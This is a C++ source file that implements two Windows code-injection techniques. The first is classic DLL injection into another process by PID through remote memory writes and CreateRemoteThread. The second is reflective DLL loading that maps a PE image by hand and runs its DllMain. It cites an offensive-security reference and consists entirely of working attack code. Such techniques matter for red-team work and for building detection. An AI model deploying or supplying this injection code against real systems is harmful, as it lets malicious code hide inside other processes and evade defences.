#include "core/technique.hpp"

// It's used for Reflective DLL Injection.
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

// It's used for Reflective DLL Injection.
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

namespace Technique::Injection
{
    BOOL DLLInjection(DWORD dwPID, LPVOID lpDllPath, size_t dwDllPathSize)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID remoteBuffer;
        BOOL bResults;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
        if (!hProcess)
        {
            return FALSE;
        }
        
        remoteBuffer = VirtualAllocEx(
            hProcess,
            NULL,
            dwDllPathSize,
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (!remoteBuffer)
        {
            return FALSE;
        }

        bResults = WriteProcessMemory(
            hProcess,
            remoteBuffer,
            lpDllPath,
            dwDllPathSize,
            NULL
        );
        if (!bResults)
        {
            return FALSE;
        }

        PTHREAD_START_ROUTINE threadStartRoutineAddr = (PTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandle(TEXT("kernel32")),
            "LoadLibraryW"
        );
        if (!threadStartRoutineAddr)
        {
            return FALSE;
        }

        hThread = CreateRemoteThread(
            hProcess,
            NULL,
            0,
            threadStartRoutineAddr,
            remoteBuffer,
            0,
            NULL
        );
        if (!hThread)
        {
            return FALSE;
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hProcess);
        CloseHandle(hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
    BOOL ReflectiveDLLInjection(LPCWSTR lpDllPath, size_t dwDllPathSize)
    {
        using LPPROC_DLLMAIN = BOOL(WINAPI*)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

        // Get this module's image base address
        PVOID imageBase = GetModuleHandleA(NULL);

        // Read DLL file and load it into memory
        HANDLE hDLL = CreateFileW(
            lpDllPath,
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        DWORD dwDllSize = GetFileSize(hDLL, NULL);
        LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDllSize);
        DWORD outSize = 0;
        ReadFile(hDLL, dllBytes, dwDllSize, &outSize, NULL);

        // Get pointers to in-memory DLL headers
        PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
        SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

        // Allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address,
        LPVOID dllBase = VirtualAlloc(
            (LPVOID)ntHeaders->OptionalHeader.ImageBase,
            dllImageSize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );

        // Get delta between this module's image base and the DLL that was read into memory
        DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

        // Copy over DLL image headers to the newly allocated space for the DLL
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
            LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
            section++;
        }

        // Perform image base relocation
        IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
        DWORD relocationsProcessed = 0;

        while (relocationsProcessed < relocations.Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
            relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

            for (DWORD i = 0; i < relocationsCount; i++) {
                relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[i].Type == 0) {
                    continue;
                }
                
                DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
                DWORD_PTR addressToPatch = 0;
                ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
                addressToPatch += deltaImageBase;
                memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
            }
        }

        // Resolve import address table
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
        IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
        LPCSTR libraryName = "";
        HMODULE hLibrary = NULL;

        while (importDescriptor->Name != 0) {
            libraryName = (LPCSTR)((PBYTE)(dllBase) + importDescriptor->Name);
            hLibrary = LoadLibraryA(libraryName);

            if (hLibrary) {
                PIMAGE_THUNK_DATA thunk = NULL;
                thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

                while (thunk->u1.AddressOfData != 0) {
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                    {
                        LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(hLibrary, functionOrdinal);
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                        DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(hLibrary, functionName->Name);
                        thunk->u1.Function = functionAddress;
                    }
                    ++thunk;
                }
            }

            importDescriptor++;
        }

        // Execute the loaded DLL
        LPPROC_DLLMAIN lpDLLMain = reinterpret_cast<LPPROC_DLLMAIN>((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        (*lpDLLMain)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

        CloseHandle(hDLL);
        HeapFree(GetProcessHeap(), 0, dllBytes);

        return TRUE;
    }
}
